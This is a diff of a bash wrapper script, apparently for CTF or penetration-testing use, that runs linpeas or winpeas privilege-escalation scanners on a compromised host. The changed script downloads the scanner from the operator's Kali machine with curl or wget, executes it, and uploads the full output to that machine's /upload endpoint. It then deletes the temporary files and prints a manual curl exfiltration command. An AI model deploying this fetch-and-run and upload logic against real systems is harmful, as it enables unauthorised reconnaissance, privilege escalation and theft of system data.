@@ -2,6 +2,7 @@
 #
 # ParsingPeas Wrapper Script
 # Runs linpeas/winpeas and automatically sends output to Kali host
+# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
 #
 
 SERVER_URL="KALI_SERVER_URL"  # Will be replaced by receiver.py
@@ -12,18 +13,8 @@ TMP_OUTPUT="/tmp/.linpeas_$(date +%s).tmp"
 echo "[*] ParsingPeas - Automated Privilege Escalation Scanner"
 echo "[*] Session ID: $SESSION_ID"
 echo "[*] Hostname: $HOSTNAME"
+echo "[*] Server: $SERVER_URL"
 echo ""
-
-# Detect OS
-if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "darwin"* ]]; then
-    SCAN_TYPE="linpeas"
-    echo "[*] Detected: Linux/Unix system"
-    SCRIPT_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
-else
-    SCAN_TYPE="winpeas"
-    echo "[*] Detected: Windows system"
-    SCRIPT_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
-fi
 
 # Check for curl
 if ! command -v curl &> /dev/null; then
@@ -35,24 +26,44 @@ if ! command -v curl &> /dev/null; then
     USE_WGET=1
 fi
 
-echo "[*] Downloading $SCAN_TYPE..."
+# Detect OS
+if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "darwin"* ]] || [[ -z "$OSTYPE" ]]; then
+    SCAN_TYPE="linpeas"
+    echo "[*] Detected: Linux/Unix system"
+    SCRIPT_ENDPOINT="$SERVER_URL/get-linpeas"
+    SCRIPT_PATH="/tmp/linpeas.sh"
+else
+    SCAN_TYPE="winpeas"
+    echo "[*] Detected: Windows system"
+    SCRIPT_ENDPOINT="$SERVER_URL/get-winpeas"
+    SCRIPT_PATH="/tmp/winpeas.exe"
+fi
 
-# Download and run linpeas
+echo "[*] Downloading $SCAN_TYPE from Kali host..."
+
+# Download script from Kali host (NOT from internet!)
+if [[ $USE_WGET ]]; then
+    wget -q -O "$SCRIPT_PATH" "$SCRIPT_ENDPOINT" || { echo "[!] Download failed"; exit 1; }
+else
+    curl -sSL "$SCRIPT_ENDPOINT" -o "$SCRIPT_PATH" || { echo "[!] Download failed"; exit 1; }
+fi
+
+if [[ ! -f "$SCRIPT_PATH" ]] || [[ ! -s "$SCRIPT_PATH" ]]; then
+    echo "[!] Error: Script download failed or empty"
+    exit 1
+fi
+
+echo "[+] Downloaded successfully"
+
+# Make executable and run
 if [[ $SCAN_TYPE == "linpeas" ]]; then
-    # Download linpeas
-    if [[ $USE_WGET ]]; then
-        wget -q -O /tmp/linpeas.sh "$SCRIPT_URL" || { echo "[!] Download failed"; exit 1; }
-    else
-        curl -sSL "$SCRIPT_URL" -o /tmp/linpeas.sh || { echo "[!] Download failed"; exit 1; }
-    fi
-    
-    chmod +x /tmp/linpeas.sh
+    chmod +x "$SCRIPT_PATH"
     
     echo "[*] Running linpeas (this may take a few minutes)..."
     echo ""
     
     # Run linpeas and save output
-    /tmp/linpeas.sh 2>&1 | tee "$TMP_OUTPUT"
+    "$SCRIPT_PATH" 2>&1 | tee "$TMP_OUTPUT"
     
     # Check if output was generated
     if [[ ! -f "$TMP_OUTPUT" ]] || [[ ! -s "$TMP_OUTPUT" ]]; then
@@ -77,12 +88,20 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
             -H "Content-Type: text/plain" \
             --data-binary "@$TMP_OUTPUT" \
             --max-time 300 \
-            "$SERVER_URL/upload" 2>&1 | grep -q '"status":"success"'; then
+            "$SERVER_URL/upload" 2>&1 | tee /tmp/.transfer_response.tmp | grep -q '"status":"success"'; then
             
+            echo ""
             echo "[+] Transfer successful!"
+            
+            # Extract and display report URL
+            REPORT_URL=$(grep -o '"report_url":"[^"]*"' /tmp/.transfer_response.tmp | cut -d'"' -f4)
+            if [[ -n "$REPORT_URL" ]]; then
+                echo "[+] View report at: $SERVER_URL$REPORT_URL"
+            fi
+            
             echo "[+] Cleaning up..."
-            rm -f /tmp/linpeas.sh "$TMP_OUTPUT"
-            echo "[+] Done! Check your Kali host for the HTML report."
+            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT" /tmp/.transfer_response.tmp
+            echo "[+] Done!"
             exit 0
         else
             RETRY_COUNT=$((RETRY_COUNT + 1))
@@ -96,6 +115,8 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
     
     echo "[!] Transfer failed after $MAX_RETRIES attempts"
     echo "[*] Output saved locally at: $TMP_OUTPUT"
+    echo "[*] You can manually transfer with:"
+    echo "    curl -X POST -H 'X-Hostname: $HOSTNAME' --data-binary @$TMP_OUTPUT $SERVER_URL/upload"
     exit 1
 fi
 
